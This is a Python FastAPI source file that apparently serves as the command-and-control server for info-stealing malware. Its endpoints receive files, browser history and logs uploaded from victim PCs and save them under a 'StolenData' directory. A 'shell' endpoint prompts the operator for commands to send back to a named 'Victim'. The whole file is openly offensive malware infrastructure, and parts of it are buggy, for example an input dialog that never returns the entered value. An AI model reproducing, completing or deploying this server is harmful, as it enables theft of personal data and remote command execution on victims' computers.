from fastapi import FastAPI, UploadFile
from pydantic import BaseModel
import os 
import threading
import tkinter as tk
from tkinter import colorchooser
import uvicorn
import json
def input_dialog(title, message):
    def ok():
        dialog_window.destroy()

    def get_input():
        value = entry.get()
        ok()

        return value

    # Create dialog window
    dialog_window = tk.Toplevel()
    dialog_window.title(title)

    # Create label
    label = tk.Label(dialog_window, text=message)
    label.pack()

    # Create entry widget
    entry = tk.Entry(dialog_window)
    entry.pack()

    # Create OK button
    ok_button = tk.Button(dialog_window, text="OK", command=get_input)
    ok_button.pack()

    # Bind Enter key to OK button
    dialog_window.bind("<Return>", lambda event: ok_button.invoke())

    # Set focus to entry widget
    entry.focus_set()

    # Wait for user input
    dialog_window.wait_window()


def show_text_in_editor(filename, text):
    # Create the main window
    root = tk.Tk()
    root.title(filename)

    # Create a text widget to display the text
    text_widget = tk.Text(root, bg="black", fg="white", font=("Arial", 12))
    text_widget.pack(expand=True, fill="both")
    def change_color(color_type, color):
        if color_type == "bg":
            text_widget.config(bg=color)
        elif color_type == "fg":
            text_widget.config(fg=color)

    def choose_custom_color(color_type):
        color = colorchooser.askcolor()[1]
        if color:
            change_color(color_type, color)

    def change_font_size(size):
        text_widget.config(font=("Arial", size))

    

    # Create a menu to change color, font size, and language
    menu_bar = tk.Menu(root)

    color_menu = tk.Menu(menu_bar, tearoff=0)
    color_menu.add_command(label="Black", command=lambda: change_color("bg", "black"))
    color_menu.add_command(label="White", command=lambda: change_color("bg", "white"))
    color_menu.add_command(label="Red", command=lambda: change_color("bg", "red"))
    color_menu.add_command(label="Green", command=lambda: change_color("bg", "green"))
    color_menu.add_command(label="Blue", command=lambda: change_color("bg", "blue"))
    color_menu.add_command(label="Custom...", command=lambda: choose_custom_color("bg"))
    menu_bar.add_cascade(label="Background Color", menu=color_menu)

    fg_color_menu = tk.Menu(menu_bar, tearoff=0)
    fg_color_menu.add_command(label="Black", command=lambda: change_color("fg", "black"))
    fg_color_menu.add_command(label="White", command=lambda: change_color("fg", "white"))
    fg_color_menu.add_command(label="Red", command=lambda: change_color("fg", "red"))
    fg_color_menu.add_command(label="Green", command=lambda: change_color("fg", "green"))
    fg_color_menu.add_command(label="Blue", command=lambda: change_color("fg", "blue"))
    fg_color_menu.add_command(label="Custom...", command=lambda: choose_custom_color("fg"))
    menu_bar.add_cascade(label="Foreground Color", menu=fg_color_menu)

    font_menu = tk.Menu(menu_bar, tearoff=0)
    font_menu.add_command(label="Small", command=lambda: change_font_size(10))
    font_menu.add_command(label="Medium", command=lambda: change_font_size(12))
    font_menu.add_command(label="Large", command=lambda: change_font_size(14))
    menu_bar.add_cascade(label="Font Size", menu=font_menu)



    root.config(menu=menu_bar)

    # Insert the text into the text widget
    text_widget.insert("1.0", text)

    # Run the main event loop to display the window
    root.mainloop()


class BrowserHistory(BaseModel):
    data:dict
    Pc_Name:str
    Browser_Name:str

class TextPayload(BaseModel):
    file_name:str
    data:str

class imgt(BaseModel):
    file_name:str
    data:str

class JUSTHENAME(BaseModel):
    Name:str
app = FastAPI()


@app.post("/api/recive/payload/{name}",status_code=200)
async def recivePaylaod(File_param:UploadFile,name:str):
    try:
        os.mkdir(os.getcwd()+"/StolenData")
    except:
        pass

    try:
        os.mkdir(os.getcwd()+f"/StolenData/{name}")
    except:
        pass

    
    try:
        os.mkdir(os.getcwd()+f"/StolenData/{name}/Files")
    except:
        pass

    with open(f"{os.getcwd()}/StolenData/{name}/Files/{File_param.filename}",'wb') as f:
        contents = await File_param.read()
        f.write(contents)



@app.post("/api/recive/text",status_code=200)
def reciveText(text:TextPayload):
    thread=[]
    thread1 =threading.Thread(target=show_text_in_editor,args=(text.file_name,text.data))
    thread1.start()
    thread.append(thread1)
    for thread2 in thread:
        thread2.join
    return {"STATUS":200}


@app.post("/api/recive/text/write",status_code=200)
async def reciveText(text:TextPayload):
    TEXT = await show_text_in_editor(text.file_name,text.data)
    return {"TEXT":TEXT}

@app.post("/api/recive/browser/history",status_code=200)
def recivehistory(DATA:BrowserHistory):
    try:
        os.mkdir(os.getcwd()+"/StolenData")
    except:
        pass

    try:
        os.mkdir(os.getcwd()+f"/StolenData/{DATA.Pc_Name}")
    except:
        pass

    try:
        os.mkdir(os.getcwd()+f"/StolenData/{DATA.Pc_Name}/BrowserData")
    except:
        pass


    try:
        os.mkdir(os.getcwd()+f"/StolenData/{DATA.Pc_Name}/BrowserData/SearchHistory")
    except:
        pass
    with open(f'{os.getcwd()}/StolenData/{DATA.Pc_Name}/BrowserData/SearchHistory/{DATA.Browser_Name}_History.json', 'w', encoding='utf-8') as f:
        json.dump(DATA.data, f,indent=4,sort_keys=True)


class Logs(BaseModel):
    pc_name:str = None
    log:str
        
@app.post("/api/recive/logs",status_code=200)
def savetologs(log:Logs):
    try:
        os.mkdir(os.getcwd()+"/logs")
    except:
        pass
    try:
        with open(f"{os.getcwd}/logs/{log.pc_name}.txt","a",encoding='utf-8',errors='ignore') as f:
            f.write(log.log)
    except Exception as e:
        print(e)


@app.get("/api/commands/recive/{Pc_Name}")
def shell(Pc_Name:str):
    res = input_dialog(title=f"Started a shell with the Victim[ {Pc_Name} ]",message="you commands")
    print(res)
    return {"CMD":str(res)}



"""
ISNT DONE YET

@app.post("/api/upload/image")
async def upload_image(file: UploadFile = File(...)):
    contents = await file.read()
    image = Image.open(io.BytesIO(contents))
    image.save(f"{file.filename}")
    return {"filename": file.filename}
"""